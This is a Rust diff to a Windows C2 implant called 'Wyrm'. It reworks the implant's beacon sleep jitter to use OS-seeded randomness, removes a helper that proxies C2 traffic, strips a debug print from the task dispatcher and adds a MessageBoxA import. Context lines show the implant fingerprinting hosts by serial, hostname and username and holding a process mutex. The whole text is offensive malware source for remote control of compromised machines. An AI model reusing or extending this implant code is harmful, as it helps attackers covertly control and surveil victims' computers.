@@ -6,8 +6,10 @@ use std::{
     sync::atomic::Ordering,
 };
 
-use rand::{Rng, rng};
-use reqwest::{Proxy, Url};
+use rand::{
+    Rng, SeedableRng, TryRngCore,
+    rngs::{OsRng, SmallRng},
+};
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
@@ -25,8 +27,10 @@ use windows_sys::{
             Threading::{CreateMutexA, GetCurrentProcess, GetCurrentProcessId},
             WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
         },
+        UI::WindowsAndMessaging::{MB_OK, MessageBoxA},
     },
     core::{PCWSTR, PWSTR},
+    s,
 };
 
 use crate::{
@@ -175,19 +179,7 @@ impl Wyrm {
         //
         // Main command dispatcher
         //
-
         while let Some(task) = self.tasks.pop_front() {
-            // This is quite noisy in debug builds, enable only if needed
-            #[cfg(debug_assertions)]
-            {
-                // use shared::pretty_print::print_info;
-
-                // print_info(format!(
-                //     "Dispatching task: {}, meta: {:?}, id: {}",
-                //     task.command, task.metadata, task.id
-                // ));
-            }
-
             match task.command {
                 Command::Sleep => {
                     // In the case of a sleep, its possible it will be in the task queue
@@ -500,28 +492,6 @@ impl Wyrm {
             None
         }
     }
-
-    /// Returns a new `ClientBuilder` with a proxy applied if applicable, otherwise returns the input CB.
-    pub fn apply_proxy_for_c2_url(
-        &self,
-        url: &str,
-        client_builder: reqwest::blocking::ClientBuilder,
-    ) -> Result<reqwest::blocking::ClientBuilder, reqwest::Error> {
-        let dest = Url::parse(url).unwrap();
-
-        if let Some(p) = self.try_get_proxy() {
-            let px = match dest.scheme() {
-                "https" => Proxy::https(p)?,
-                "http" => Proxy::http(p)?,
-                _ => Proxy::all(p)?,
-            };
-
-            let client_builder = client_builder.proxy(px);
-            return Ok(client_builder);
-        }
-
-        Ok(client_builder)
-    }
 }
 
 /// Builds the implant ID, in the form: serial_hostname_username. The serial number associated with the
@@ -617,8 +587,13 @@ pub fn calculate_sleep_seconds(wyrm: &Wyrm) -> u64 {
         }
     };
 
-    let mut rng = rng();
-    rng.random_range(min_sleep..=wyrm.c2_config.sleep_seconds)
+    let mut seed = [0u8; 32];
+    if let Ok(_) = OsRng.try_fill_bytes(&mut seed) {
+        let mut rng = SmallRng::from_seed(seed);
+        rng.random_range(min_sleep..wyrm.c2_config.sleep_seconds)
+    } else {
+        1
+    }
 }
 
 struct WyrmMutex {
